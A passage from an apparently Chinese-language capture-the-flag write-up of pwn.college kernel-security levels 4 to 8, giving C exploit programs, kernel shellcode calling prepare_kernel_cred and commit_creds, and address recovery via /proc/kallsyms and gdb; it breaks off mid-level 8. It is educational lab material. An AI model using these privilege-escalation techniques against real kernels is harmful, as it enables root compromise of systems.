class="hljs-string">&quot;limtlgzgaygslnew&quot;</span>;<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h3><p>交互方式改为了ioctl，逻辑依然是验证password后提权。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;iihowwbwnjhzequx&quot;</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,key);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h3><p>逻辑不变,改password即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;ayftgqtvlhllbakz&quot;</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,key);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h3><p>执行参数中的函数指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a2, <span class="hljs-type">void</span> (*a3)(<span class="hljs-type">void</span>))</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_618, a1, a2, a3);<br>  result = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">1337</span> )<br>  &#123;<br>    a3(); <span class="hljs-comment">//call</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>正好win函数最后一个函数是通过jmp调用的，如果传入的a3是win函数的地址，提权完成后执行到<code>commit_creds</code>函数中的ret时可以返回到<code>device_ioctl</code>，使执行流恢复正常。那么考虑如何获取win函数的地址即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text.unlikely:00000000000005AD                               ; __int64 __fastcall win(__int64, __int64, __int64, __int64)<br>.text.unlikely:00000000000005AD                               win proc near<br>.text.unlikely:00000000000005AD 48 C7 C7 48 06 00 00          mov     rdi, offset unk_648<br>.text.unlikely:00000000000005B4 E8 DF 08 00 00                call    printk                          ; PIC mode<br>.text.unlikely:00000000000005B4<br>.text.unlikely:00000000000005B9 31 FF                         xor     edi, edi<br>.text.unlikely:00000000000005BB E8 F0 08 00 00                call    prepare_kernel_cred             ; PIC mode<br>.text.unlikely:00000000000005BB<br>.text.unlikely:00000000000005C0 48 89 C7                      mov     rdi, rax<br>.text.unlikely:00000000000005C3 E9 E0 08 00 00                jmp     commit_creds                    ; PIC mode<br></code></pre></td></tr></table></figure>

<p>二进制文件中只有函数在代码段中相对基址的偏移，接下来寻找该模块的代码段加载基址。</p>
<p>未开启kaslr，因此在同一套仿真环境中，内核中.text代码段加载基址是相同的，一般来说是<code>0xffffffff81000000</code>，原因可参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578569516">Linux物理内存映射</a>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">vm logs | grep kaslr</span><br>[    0.000000] Command line: rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init nokaslr<br>[    0.477623] Kernel command line: rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init nokaslr<br></code></pre></td></tr></table></figure>

<p>可通过<code>cat /proc/kallsyms | grep _text</code>命令验证基址，因为<code>_text</code>符号就标记了.text段基址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level5-0:~# cat /proc/kallsyms | grep _text<br>ffffffff81000000 T _text<br>ffffffff81023880 t __text_poke<br>ffffffff81023f90 T alternatives_text_reserved<br>...<br></code></pre></td></tr></table></figure>

<p>但是这并不是模块中代码段的加载基址，特定模块的加载基址可以通过<code>cat /sys/module/模块名称/sections/.text</code>命令获得</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level5-0:~# cat /sys/module/challenge/sections/.text<br>0xffffffffc0000000<br></code></pre></td></tr></table></figure>

<p>那么通过基址+偏移可算得<code>win</code>函数地址为<code>0xffffffffc00005ad</code></p>
<p>内核模块载入后其符号也会导入，因此也可以通过<code>/proc/kallsyms</code>获取<code>win</code>函数地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level5-0:~# cat /proc/kallsyms | grep win<br>...<br>ffffffffc00005ad t win  [challenge]<br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> win =  <span class="hljs-number">0xffffffffc00005ad</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,win);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h3><p>同level5.0，<code>win</code>函数偏移改变了，基址没变，改下偏移即可</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> win =  <span class="hljs-number">0xffffffffc0000872</span>;<br>    ioctl(fd,<span class="hljs-number">1337</span>,win);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level6-0-amp-level6-1"><a href="#level6-0-amp-level6-1" class="headerlink" title="level6.0 &amp; level6.1"></a>level6.0 &amp; level6.1</h3><p>编写shellcode进行cred提权</p>
<p>在<code>practice mode</code>通过<code>/proc/kallsyms</code>获取符号地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level6-0:~# cat /proc/kallsyms | grep prepare_kernel_cred<br>ffffffff810890d0 T prepare_kernel_cred<br>root@vm_practice~kernel-security~level6-0:~# cat /proc/kallsyms | grep commit_creds<br>ffffffff81088d90 T commit_creds<br></code></pre></td></tr></table></figure>

<p> 编写shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">.intel_syntax noprefix<br><br>.section .text<br>.global _start<br>_start:<br>    xor rdi,rdi<br>    mov rcx,0xffffffff810890d0  #prepare_kernel_cred<br>    call rcx<br>    mov rdi,rax<br>    mov rcx,0xffffffff81088d90  #commit_creds<br>    call rcx<br>    ret<br></code></pre></td></tr></table></figure>

<p>编译后提取16进制shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -c cred.s -o cred -masm=intel -nostdlib -Ttext=0<br>./bin2shellcode cred<br>\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\xc3<br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\xc3&quot;</span>;<br>    write(fd,shellcode,<span class="hljs-built_in">strlen</span>(shellcode));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level7-0-amp-level7-1"><a href="#level7-0-amp-level7-1" class="headerlink" title="level7.0 &amp; level7.1"></a>level7.0 &amp; level7.1</h3><p>ioctl交互，操作码1337，参数a3的结构为:8字节的shellcode长度、长度为0x1000的shellcode缓冲区、8字节的shellcode地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">shellcode = _vmalloc(<span class="hljs-number">4096LL</span>, <span class="hljs-number">0xCC0</span>LL, _default_kernel_pte_mask &amp; <span class="hljs-number">0x163</span>);<br><br><span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">1337</span> )<br>  &#123;<br>    copy_from_user(&amp;v5, a3, <span class="hljs-number">8LL</span>);<br>    copy_from_user(v6, a3 + <span class="hljs-number">0x1008</span>, <span class="hljs-number">8LL</span>);<br>    result = <span class="hljs-number">-2LL</span>;<br>    <span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">0x1000</span> )<br>    &#123;<br>      copy_from_user(shellcode, a3 + <span class="hljs-number">8</span>, v5);<br>      ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))v6[<span class="hljs-number">0</span>])();<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>shellcode的地址是vmalloc申请的，vmalloc申请内存的基址为<code>VMALLOC_START</code>，偏移作为<code>_vmalloc</code>函数的返回值存放在bss段上的shellcode变量中。</p>
<p>获取bss段的shellcode变量地址：模块bss段加载基址+bss段内偏移</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@vm_practice~kernel-security~level7-0:~# cat /sys/module/challenge/sections/.bss<br>0xffffffffc0002440<br><span class="hljs-meta prompt_">#</span><span class="language-bash">sc_addr = (E88-E80) + 0xffffffffc0002440 = 0xffffffffc0002448</span><br></code></pre></td></tr></table></figure>

<p>gdb调试内核得到bss段上shellcode变量的值为0x85000</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) b *0xffffffffc00005ac<br>Note: breakpoint 1 also set at pc 0xffffffffc00005ac.<br>Breakpoint 2 at 0xffffffffc00005ac<br>(gdb) c<br>Continuing.<br><br>Thread 1 hit Breakpoint 1, 0xffffffffc00005ac in ?? ()<br>1: x/5i $rip<br>=&gt; 0xffffffffc00005ac:  push   %rbp<br>   0xffffffffc00005ad:  mov    %rdx,%rcx<br>   0xffffffffc00005b0:  mov    %esi,%ebp<br>   0xffffffffc00005b2:  push   %rbx<br>   0xffffffffc00005b3:  mov    %rdx,%rbx<br>(gdb) b *0xffffffffc0000621<br>Breakpoint 3 at 0xffffffffc0000621<br>(gdb) c<br>Continuing.<br><br>Thread 1 hit Breakpoint 3, 0xffffffffc0000621 in ?? ()<br>1: x/5i $rip<br>=&gt; 0xffffffffc0000621:  mov    0x1e20(%rip),%rdi        # 0xffffffffc0002448<br>   0xffffffffc0000628:  lea    0x8(%rbx),%rsi<br>   0xffffffffc000062c:  callq  0xffffffff813ac640 &lt;_copy_from_user&gt;<br>   0xffffffffc0000631:  mov    0x8(%rsp),%rax<br>   0xffffffffc0000636:  callq  0xffffffff81e00ea0 &lt;__x86_indirect_thunk_rax&gt;<br>(gdb) p/x 0xffffffffc0002448<br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 0xffffffffc0002448</span><br>(gdb) p/x *0xffffffffc0002448<br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = 0x85000</span><br></code></pre></td></tr></table></figure>

<p><code>VMALLOC_START</code>可以在linux内核源码<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/pgtable_64_types.h#L124"><code>/arch/x86/include/asm/pgtable_64_types.h</code></a>中获取。</p>
<p>在不开启<code>kASLR</code>的情况下<code>VMALLOC_START</code>固定为<code>0xffffc90000000000</code>;</p>
<p>开启kASLR时，<code>CONFIG_DYNAMIC_MEMORY_LAYOUT</code>值为1，<code>VMALLOC_START</code>随机化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMALLOC_BASE_L4	0xffffc90000000000UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMALLOC_BASE_L5 	0xffa0000000000000UL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VMALLOC_SIZE_TB_L4	32UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VMALLOC_SIZE_TB_L5	12800UL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMEMMAP_BASE_L4	0xffffea0000000000UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __VMEMMAP_BASE_L5	0xffd4000000000000UL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DYNAMIC_MEMORY_LAYOUT</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_START		vmalloc_base</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_SIZE_TB	(pgtable_l5_enabled() ? VMALLOC_SIZE_TB_L5 : VMALLOC_SIZE_TB_L4)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMEMMAP_START		vmemmap_base</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_START		__VMALLOC_BASE_L4</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMALLOC_SIZE_TB	VMALLOC_SIZE_TB_L4</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> VMEMMAP_START		__VMEMMAP_BASE_L4</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_DYNAMIC_MEMORY_LAYOUT */</span></span><br></code></pre></td></tr></table></figure>

<p>计算得到shellcode地址为：<code>0xffffc90000085000 = 0xffffc90000000000 + 0x85000</code></p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>+<span class="hljs-number">8</span>+<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> sc[] = <span class="hljs-string">&quot;\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\xc3&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length = <span class="hljs-built_in">strlen</span>(sc);<br>    <span class="hljs-type">void</span> *sc_addr = <span class="hljs-number">0xffffc90000085000</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf,&amp;length,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf+<span class="hljs-number">8</span>,sc,length);<br>    <span class="hljs-built_in">memcpy</span>(buf+<span class="hljs-number">0x1008</span>,&amp;sc_addr,<span class="hljs-number">8</span>);<br><br>    ioctl(fd,<span class="hljs-number">1337</span>,buf);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level8-0-amp-level8-1"><a href="#level8-0-amp-level8-1" class="headerlink" title="level8.0 &amp; level8.1"></a>level8.0 &amp; level8.1</h3><p>创建设备文件时<code>proc_create</code>函数的第二个参数由438变为了384，设备文件仅root用户可访问。<code>/challenge</code>还有一个设置了<code>suid</code>位的<code>babykernel_level8.0</code>文件，只能通过该用户态程序访问设备文件。</p>
<p> 用户态程序中开启了沙箱，只允许使用<code>write</code>。然后执行用户态shellcode。</p>
<p>用户态shellcode需要做以下事情：</p>
<ul>
<li>通过write和设备文件交互，传入用于cred提权和seccomp沙箱逃逸的内核态shellcode</li>
<li>在用户态读取flag并输出</li>
</ul>
<p>首先编写内核shellcode</p>
<p>在前文<code>Writing Kernel Shellcode</code>一节中我们发现由于<code>gs</code>和<code>fs</code>在段寄存器中的特殊性，通过反汇编自定义代码构建的内核模块寻找<code>thread_info-&gt;flags</code>成员在<code>task_struct</code>中偏移的方式并不可取，甚至<code>gs</code>寄存器中存放的都不是<code>current_task_struct</code>的真实偏移。</p>
<ul>
<li>寻找<code>current</code>真实偏移</li>
</ul>
<p>我们需要寻找内核中包含寻址<code>current</code>操作的函数，在gdb中查看其汇编来寻找当前进程的<code>task_struct</code>的真实偏移。</p>
<p><code>uname -r</code>确定内核版本为<code>5.4.0</code></p>
